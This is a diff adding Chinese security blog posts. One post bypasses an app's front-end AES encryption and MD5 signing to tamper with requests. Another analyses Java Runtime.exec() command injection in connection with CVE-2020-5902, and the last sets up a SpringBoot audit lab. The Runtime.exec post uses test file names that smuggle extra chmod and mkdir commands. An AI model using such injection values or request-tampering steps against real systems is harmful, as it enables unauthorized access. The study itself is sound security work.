+<p>某app的h5页面显示的链接是 <a href="https://app.xxx.com/function/#/pages/queryDetails?id=644626" target="_blank" rel="noopener">https://app.xxx.com/function/#/pages/queryDetails?id=644626</a> 这种类型的，URl中参数在<code>#</code>之后，这种样式的URL基本都是前后端分离的系统，也就是会通过JS会处理很多事务。</p>
+<a id="more"></a>
+
+<p>实际上在burp中抓包它的请求链接是 <a href="https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx" target="_blank" rel="noopener">https://app.xxx.com/app/gateway/queryServices/011023?reqno=M4NofxiOtz4SvYpx</a> 这样的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/encrypt-request-data.jpg" alt="encrypt-request-data"></p>
+<p>测试过程中我的第一反应是尝试从js中将加解密方法找出来（虽然这个链接是app的，但是网页能访问，那它就一定是js加解密的，js加解密我个人认为比逆向app简单很多，而且也方便调试）。</p>
+<p>但有一点需要注意，前后端分离的系统，会对js压缩和混淆，一方面是减轻js的体量，另一方面能在一定程度上防止他人通过js分析出关键代码。所以在被压缩混淆的js中调试也还是有一定难度的。</p>
+<p>所幸网站的js很少，且大部分应用加密传输使用AES对报文进行加密，再使用RSA传输AES的密钥。</p>
+<p>随便找找就发现AES加密的js代码，在代码中发现加密方式是<code>CBC Pkcs7</code></p>
+<p>密钥o：<code>^BJSHGZ!@#ZZZDGJ</code>（密钥并不是这个，真实的密钥需要看变量n，数组arguments如果大于1，则使用arguments中的密钥，这个arguments具体是怎么来的我没搞懂，不过不重要，调试的时候我们能直接得到密钥的值，可以不用具体分析）</p>
+<p>偏移量iv：<code>0108489312380708</code></p>
+<p>AES加解密的过程如下图，还是比较清晰的。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-encrypt-code.png" alt="js-encrypt-code"></p>
+<p>下图是调试过程，密钥就直接拿到了：</p>
+<p><img src="/2020/04/03/JS-Decrypt/get-aes-key.png" alt="get-aes-key"></p>
+<p>⚠️ 这里有个js混淆的坑，对于不咋熟悉js的我，1824行 <code>u.default.encrypt</code>我还以为是另一种加密，在这里找这个是什么加密方法找了好久，结果它就是调用上图AES加密的方法，想太多了……</p>
+<p><img src="/2020/04/03/JS-Decrypt/aes-default-encrypt.jpg" alt="aes-default-encrypt"></p>
+<p>知道加解密方法，之后就可以尝试对参数进行修改了，同样是在调试过程，把参数取出，或者通过AES解密请求中的request body得到的请求参数，进行修改。</p>
+<p><img src="/2020/04/03/JS-Decrypt/unencrypt-request-body.png" alt="unencrypt-request-body"></p>
+<p>修改完成之后进行AES加密，我使用的是 <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/</a> ，加密过程调成如下图：</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-aes-encrypt.png" alt="cyberchef-aes-encrypt"></p>
+<p>request body的加密就到这了。response body解密使用的密钥，iv，模式，填充都一样，是逆过程就不多写了。</p>
+<p>最后一个重点就是修改签名，修改完request body之后的签名肯定就变化了，就需要跟随请求来修改签名。</p>
+<p>签名大概的算法如下图，不咋懂js的我刚看到这时是一脸的懵逼。</p>
+<p><img src="/2020/04/03/JS-Decrypt/js-add-sign.png" alt="js-add-sign"></p>
+<p>不过好在可以调试，通过调试可以看到算出Q所需要的参数，不过不用那么麻烦，直接看Q前一步就行了，<code>Q = (0, g.default) (D).toString()</code>，也就是查看D是什么</p>
+<p>通过调试可以知道，D是：（去除了\）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">9924531585918379141792&#x2F;queryServices&#x2F;011023reqno&#x3D;M4NofxiOtz4SvYpx&#123;&quot;head&quot;:&#123;&quot;client&quot;:&quot;ABC&quot;,&quot;transactionno&quot;:&quot;72789911122233&quot;,&quot;transactiontype&quot;:&quot;lis&quot;,&quot;transactionexedate&quot;:&quot;2020-04-03&quot;,&quot;transactionexetime&quot;:&quot;01:26:29&quot;&#125;,&quot;body&quot;:&quot;120001111&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>D是由M+T+B+S+x组成的，我们修改的只是请求参数，请求参数在x中，也就是说我们修改其他参数我们都不用改。直接在调试过程中得到的D中修改请求参数，再对D进行hash就得到了sign。</p>
+<p>⚠️ 确定签名算法中有一步就是因为hash方法弄错了导致浪费了很多时间，我在js代码中某处看到了sha1，我就以为hash方法是sha1，结果hash方法是md5…… Orz 怪不得我之前的加签都和结果对不上，还以为漏了算法中的某一步。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign.png" alt="debug-sign"></p>
+<h1 id="实操环节"><a href="#实操环节" class="headerlink" title="实操环节"></a>实操环节</h1><p>访问网页，打开F12开发者工具，选择Debugger，点击index.js，在1522行和1835行下断点，</p>
+<p>然后复制n和iv的值</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-aes-key.png" alt="debug-aes-key"></p>
+<p>其他配置可参考下图，mode是CBC，padding是pkcs7（如果你的AES加解密没有pkcs7，选pkcs5也是一样的）</p>
+<p><img src="/2020/04/03/JS-Decrypt/cyberchef-set-aes-encrypt.png" alt="cyberchef-set-aes-encrypt"></p>
+<p>点击继续，跳到下一个断点，这里可以复制E的值，E就是request body的值（记得得去掉<code>\</code>）直接得到请求内容，然后修改它。再复制D（去掉<code>\</code>），同样在请求参数中修改它。</p>
+<p><img src="/2020/04/03/JS-Decrypt/debug-sign-2.jpg" alt="debug-sign-2"></p>
+<p>修改完成之后，将E的值进行AES加密作为新的request body，D的值进行md5，就能得到signature的值。此时就能对报文参数修改测试了。</p>
+<p><img src="/2020/04/03/JS-Decrypt/burp-request.png" alt="burp-request"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java Runtime.getRuntime().exec()碰到的问题</title>
+    <url>/2020/07/18/Java-Runtime.getRuntime.exec/</url>
+    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在CVE-2020-5902 F5-BigIP-TMUI远程代码执行漏洞分析中<code>WorkspaceUtils.saveFile()</code>碰到这么一段代码。</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/f5-runtime.png" alt="f5-runtime"></p>
+<p>众所周知，<code>Runtime.getRuntime.exec()</code>在Java中用来执行系统命令。<a id="more"></a></p>
+<p>本以为Java和其他语言一样可能会导致命令注入的问题，但经过测试发现该处并不能造成任意命令执行，于是对<code>Runtime.getRuntime.exec()</code>进行分析。</p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><blockquote>
+<p>测试时Java版本为1.8.0_221</p>
+</blockquote>
+<p>先在<code>/tmp</code>目录下新建两个测试文件：<code>test1.txt</code>和<code>test2.txt</code>，此时权限是644（rw-r–r–）</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/before-chmod.png" alt="before-chmod"></p>
+<p>为了方便测试，我们将F5中的代码简化一下，代码将<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>文件权限变为777</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/chmod 777 /tmp/test2.txt"</span>;</span><br><span class="line">        String[] chmodCmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/chmod"</span>, <span class="string">"777"</span>, fileName&#125;;</span><br><span class="line">        Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行代码，发现文件权限并没有变化。</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/array-chmod.png" alt="array-chmod"></p>
+<p>再使用字符串形式传递command参数，变成如下形式，</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/chmod 777 /tmp/test2.txt"</span>;</span><br><span class="line">        String chmodCmd = <span class="string">"/bin/chmod 777 "</span> + fileName;</span><br><span class="line">        Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行代码，此时发现两个文件的权限都变成777（rwxrwxrwx）</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/string-chmod.png" alt="string-chmod"></p>
+<p>那么是不是可以说明，使用字符串传递command参数就能产生命令注入的漏洞？</p>
+<p>并不是这样，我们将执行的命令改成<code>/tmp/test1.txt</code>变为644，<code>/tmp/test2.txt</code>变成700</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/chmod 700 /tmp/test2.txt"</span>;</span><br><span class="line">        String chmodCmd = <span class="string">"/bin/chmod 644 "</span> + fileName;</span><br><span class="line">        Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行代码，发现都变成了644（rw-r–r–），而不是一个644，一个700。具体原因在分析章节中会讲到。</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/diff-string-chmod.png" alt="diff-string-chmod.png"></p>
+<p>我们再来看下面一个例子，将<code>/tmp/test1.txt</code>文件权限变为777，另外在<code>/tmp/</code>中新建一个名为<code>seikei</code>的文件夹。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei"</span>;</span><br><span class="line">        String chmodCmd = <span class="string">"/bin/chmod 777 "</span> + fileName;</span><br><span class="line">        Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行代码，此时仅是<code>/tmp/test1.txt</code>权限改成777，并没有生成<code>/tmp/seikei</code>文件夹。</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/chmod-mkdir.png" alt="chmod-mkdir"></p>
+<p>那么为什么会导致以上现象发生，下面我们通过代码来分析一下。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先来看<code>Runtime.getRuntime.exec()</code>的代码，<code>Runtime.getRuntime.exec()</code>有以下六种重载方法，虽然应用程序可能会调用不同的重载方法，最终都会执行到<code>public Process exec(String[] cmdarray, String[] envp, File dir)</code></p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/runtime-getRuntime-exec.png" alt="runtime-getRuntime-exec"></p>
+<p>先来看第三个<code>public Process exec(String command, String[] envp, File dir)</code>，也就是传入将命令以字符串的形式传入。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (command.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Empty command"</span>);</span><br><span class="line"></span><br><span class="line">    StringTokenizer st = <span class="keyword">new</span> StringTokenizer(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> String[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其中将字符串形式的command参数使用<code>StringTokenizer</code>类进行实例化，<code>StringTokenizer</code>用于构造一个字符串分词器，它根据指定字符将字符串分成字符串数组，指定字符为：空格等字符（ascii十进制数值在32以下）、制表符（\t）、换行符（\n）、回车符（\r）、换页符（\f）</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/StringTokenizer.png" alt="StringTokenizer"></p>
+<p>我们先使用字符串形式传递command参数，进行调试</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei"</span>;</span><br><span class="line">        String chmodCmd = <span class="string">"/bin/chmod 777 "</span> + fileName;</span><br><span class="line">        Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到<code>/bin/chmod 777 /tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>被转换成cmdarray[6]，也就是<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/mkdir&quot;,&quot;/tmp/seikei&quot;]</code></p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/command-string.png" alt="command-string"></p>
+<p>我们再使用字符串数组的格式，对比一下两者的差别</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei"</span>;</span><br><span class="line">        String[] chmodCmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/chmod"</span>, <span class="string">"777"</span>, fileName&#125;;</span><br><span class="line">        Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时为cmdarray[3]，也就是<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei&quot;]</code>，这是Java命令执行中第一个需要注意的点。</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/command-array.png" alt="command-array"></p>
+<p>不管传入的是字符串命令还是字符串数组命令，都会将传入的命令统一转换成cmdarray[]也就是字符串数组，之后再将转换成字符串数组的命令使用<code>ProcessBuilder</code>处理。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ProcessBuilder(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>ProcessBuilder.start()</code>中又会调用<code>ProcessImpl.start()</code>，在<code>ProcessImpl.start()</code>中创建一个<code>UNIXProcess</code>（调试环境为Mac OS，所以是起一个Unix进程）执行命令。其中过程非常简单不过多赘述，需要注意的是<code>UNIXProcess</code>的参数，其中第一个参数<code>toCString(cmdarray[0])</code>就是我们传入的cmdarray数组中第一个元素，也就是需执行的命令。而cmdarray数组中剩余的元素则放在<code>argBlock</code>中。</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/UNIXProcess.png" alt="UNIXProcess"></p>
+<p>也就是说只要我们无法控制被执行命令的第一个元素，就无法控制<code>Runtime.getRuntime().exec()</code>中执行的命令，因为后续的元素都将会是第一个元素所代表的命令的参数。</p>
+<p>就拿我们之前的命令举例：<code>/bin/chmod 777 /tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code></p>
+<p>若以字符串形式传入<code>Runtime.getRuntime().exec()</code>，会被解析成<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/mkdir&quot;,&quot;/tmp/seikei&quot;]</code></p>
+<p>此时，执行的命令是<code>/bin/chmod</code>，数组后面的所有元素都会被当作该<strong>命令的参数</strong>去执行，而不会因为<code>&amp;&amp;</code>而被解析成两条语句。这里特别需要理解<strong>命令的参数</strong>是什么意思？使用<code>man chmod</code>查看<code>chmod</code>命令的详细解释，其中<code>SYNOPSIS</code>中<code>chmod</code>后面的内容都是参数。</p>
+<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/man-chmod.png" alt="man-chmod"></p>
+<p>此时<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/mkdir&quot;,&quot;/tmp/seikei&quot;]</code>仅仅执行到了<code>/bin/chmod 777 /tmp/test1.txt</code>，后面的<code>&amp;&amp; /bin/mkdir /tmp/seikei</code>会被认为是错误的语法而不执行。</p>
+<p>但是在第二个测试案例<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test2.txt&quot;]</code>中<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>都是存在的，因为命令存在一定的容错性，所以等于执行的是<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;/tmp/test2.txt&quot;]</code>，也就是将<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>的权限同时改为777。</p>
+<p>第三个测试案例<code>[&quot;/bin/chmod&quot;,&quot;644&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/chmod&quot;,&quot;700&quot;,&quot;/tmp/test2.txt&quot;]</code>也就将<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>的权限同时改为644，而不是一个644，一个700。因为<code>[&quot;&amp;&amp;&quot;,&quot;/bin/chmod&quot;,&quot;700&quot;]</code>在这里是没有起到任何作用的。</p>
+<p>我们再来看若命令以数组形式传递进来，<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei&quot;]</code></p>
+<p>此时<code>/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>会被当作file参数，也就是更改<code>/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>这个文件的权限，但是<code>/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>该文件是不存在的，因为有空格和<code>&amp;</code>符号，所以执行不会有结果。</p>
+<p>那么，只要Java中的<code>Runtime.getRuntime().exec()</code>第一个字段不可控，就一定不会造成危害吗？</p>
+<p>不是的，还可以考虑该命令是否存在参数注入的问题。若第一个字段是执行bash命令，也可以尝试base64等编码形式同时执行多条语句。</p>
+<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>由于Java的安全设计，已经尽可能规避了命令执行的风险。执行命令时仅仅将命令数组中第一个元素作为操作系统的进程去执行，其后全部元素都是该进程的参数。</p>
+<p>若是使用数组形式传递命令，数组中单个元素只作为单一参数去执行，不会因为空格等字符就分开执行。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计一 - 前期准备</title>
+    <url>/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/</url>
+    <content><![CDATA[<p>本系列文章使用SpringBoot+Mybaits的小型商城作为本次代码审计的目标，项目地址：<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">https://github.com/newbee-ltd/newbee-mall</a> </p>
+<p>SpringBoot+Mybatis这套架构使用较为广泛，相比于SpringMVC，SpringBoot简化了很多配置，更易上手使用。并且该项目属于小型系统，程序逻辑较为简单，作者编码规范，搭建也非常方便，只需要配置数据库（MySQL）和商品图片资源，SpringBoot自带中间件，无需额外配置中间件，方便调试，代码中没看懂的逻辑，下断点上手调试非常便捷，非常适合新手入门代码审计。</p>
+<a id="more"></a>
+
+<h1 id="代码配置"><a href="#代码配置" class="headerlink" title="代码配置"></a>代码配置</h1><p>从项目地址：<a href="https://github.com/newbee-ltd/newbee-mall" target="_blank" rel="noopener">https://github.com/newbee-ltd/newbee-mall</a> 下载代码，在IntelliJ IDEA中导入<code>pom.xml</code>，IDEA会以maven项目打开并自动下载依赖包。</p>
+<p>Spring属性文件路径：<code>/src/main/resources/application.properties</code>，其中可修改端口和mysql数据库地址</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8089</span></span><br><span class="line"><span class="attr">...</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/newbee_mall_db?...</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>配置文件路径：<code>/src/main/java/ltd/newbee/mall/config/NeeBeeMallWebMvcConfigurer.java</code>，其中配置了图片路径</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line">    registry.addResourceHandler(<span class="string">"/upload/**"</span>).addResourceLocations(<span class="string">"file:"</span> + Constants.FILE_UPLOAD_DIC);</span><br><span class="line">    registry.addResourceHandler(<span class="string">"/goods-img/**"</span>).addResourceLocations(<span class="string">"file:"</span> + Constants.FILE_UPLOAD_DIC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此时是没有测试数据的，需要将<code>/src/main/resources/upload.zip</code>压缩包中的测试商品数据解压出来，放到任意的目录中。此处作为学习测试使用，可以直接解压在当前路径下，正式系统中一定要存放在非项目路径下。</p>
+<p>在文件<code>src/main/java/ltd/newbee/mall/common/Constants.java</code>中，变量<code>FILE_UPLOAD_DIC</code>为当前上传图片路径，将其更改为我们解压<code>upload.zip</code>的<strong>绝对</strong>路径</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Constants</span> </span>&#123;</span><br><span class="line">    <span class="comment">//上传文件的默认url前缀，根据部署设置自行修改</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String FILE_UPLOAD_DIC = <span class="string">"/some_path/src/main/resources/upload/"</span>;</span><br><span class="line">    <span class="comment">//public final static String FILE_UPLOAD_DIC = "D:\\upload\\";//上传文件的默认url前缀，根据部署设置自行修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="MySQL数据库配置"><a href="#MySQL数据库配置" class="headerlink" title="MySQL数据库配置"></a>MySQL数据库配置</h1><p>过程中使用docker来快速搭建测试所需的数据库，docker方便更改测试过程中使用到的各组件版本，并且测试结束后可删除容器而不对本地环境造成任何影响。</p>
+<p>使用其他方法安装mysql数据库也行，记得要在配置文件中更改mysql地址。代码部署在docker内也是可以的，不过考虑调试方便，还是建议直接本地运行代码，有远程调试经验的同学可以尝试将代码一同布置在docker内。</p>
+<p>拉取mysql（latest为最新版本，需要其他版本可将lastest改为具体版本号即可）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mysql:latest</span><br></pre></td></tr></table></figure>
+
+<p>运行（因为仅作为测试环境，并且在容器里，所以将mysql密码设置为简单密码，非测试环境慎重）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql</span><br></pre></td></tr></table></figure>
+
+<p>进入容器，确定MySQL正常运行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it mysql /bin/bash</span><br><span class="line"></span><br><span class="line">root@815203ed6f5a:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password: 123456</span><br><span class="line">mysql&gt; select @@version;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/mysql-version.png" alt="mysql-version"></p>
+<p>另起一个终端，将sql文件复制到容器内（8d3b6661cdd2是容器ID）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp /some_path/newbee-mall/src/main/resources/newbee_mall_schema.sql 815203ed6f5a:/root</span><br></pre></td></tr></table></figure>
+
+<p>回到容器，建立数据库（如果这里更改了数据库名，需要同时修改<code>application.properties</code>中mysql连接的数据库名）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">mysql&gt; create database newbee_mall_db；</span><br><span class="line">mysql&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>执行sql文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:/<span class="comment"># mysql -u root -p newbee_mall_db&lt;/root/newbee_mall_schema.sql</span></span><br></pre></td></tr></table></figure>
+
+<p>进行简单的数据库查询，校验是否成功导入SQL。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use newbee_mall_db;</span><br><span class="line">mysql&gt; select * from tb_newbee_mall_admin_user;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/mysql-import-sql.png" alt="mysql-import-sql"></p>
+<p>看到能成功查询我们导入的SQL，配置成功～（中文字符没显示出来，被<code>?</code>代替）</p>
+<h1 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h1><p>以上步骤完成后，在IntelliJ IDEA中运行项目，访问在<code>application.properties</code>中配置的端口就能看到项目。</p>
+<p><img src="/2020/04/25/JavaSpringBootCodeAudit-1-Preparation/run-application.png" alt="run-application"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计二 - Spring Boot项目结构介绍</title>
+    <url>/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/</url>
+    <content><![CDATA[<h1 id="Spring-Boot项目结构"><a href="#Spring-Boot项目结构" class="headerlink" title="Spring Boot项目结构"></a>Spring Boot项目结构</h1><p>一个简单Spring Boot项目的目录结构如下图</p>
+<img src="/2020/04/26/JavaSpringBootCodeAudit-2-SpringBoot/springboot-directory.png" alt="springboot-directory" style="zoom:33%;">
+
+<a id="more"></a>
+
+<p>Java代码都在<code>src/main/java/</code>目录下，<code>src/main/resources/</code>中放置资源文件。</p>
+<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p><code>common/</code>: 存放通用类，如工具类和通用返回结果</p>
+<p><code>config/</code>: 存放配置文件</p>
+<p><code>controller/</code>: 存放控制器，接收从前端传来的参数，对访问控制进行转发、各类基本参数校验或者不复用的业务简单处理等。</p>
+<p><code>dao/</code>: 数据访问层，与数据库进行交互，负责数据库操作，在Mybaits框架中存放自定义的Mapper接口</p>
+<p><code>entity/</code>: 存放实体类</p>
+<p><code>interceptor/</code>: 拦截器</p>
+<p><code>service/</code>: 存放服务类，负责业务模块逻辑处理。<code>Service</code>层中有两种类，一是<code>Service</code>，用来声明接口；二是<code>ServiceImpl</code>，作为实现类实现接口中的方法。</p>
+<p><code>utils/</code>: 存放工具类</p>
+<p><code>NewBeeMallApplication.java</code>: Spring Boot启动类</p>
+<p>非该项目，但可能存在的文件夹：</p>
+<p><code>dto/</code>:  存放数据传输对象（Data Transfer Object），如请求参数和返回结果</p>
+<p><code>vo/</code>:  视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄漏，保证数据安全</p>
+<p><code>constant/</code>:  存放常量</p>
+<p><code>filter/</code>: 存放过滤器</p>
+<p><code>component/</code>: 存放组件</p>
+<h2 id="资源目录结构"><a href="#资源目录结构" class="headerlink" title="资源目录结构"></a>资源目录结构</h2><p>在<code>src/main/resources</code>下存放资源文件</p>
+<p><code>mapper/</code>: 存放Mybaits的mapper.xml文件</p>
+<p><code>static/</code>: 静态资源文件目录（Javascript、CSS、图片等），在这个目录中的所有文件可以被直接访问</p>
+<p><code>templates/</code>: 存放模版文件</p>
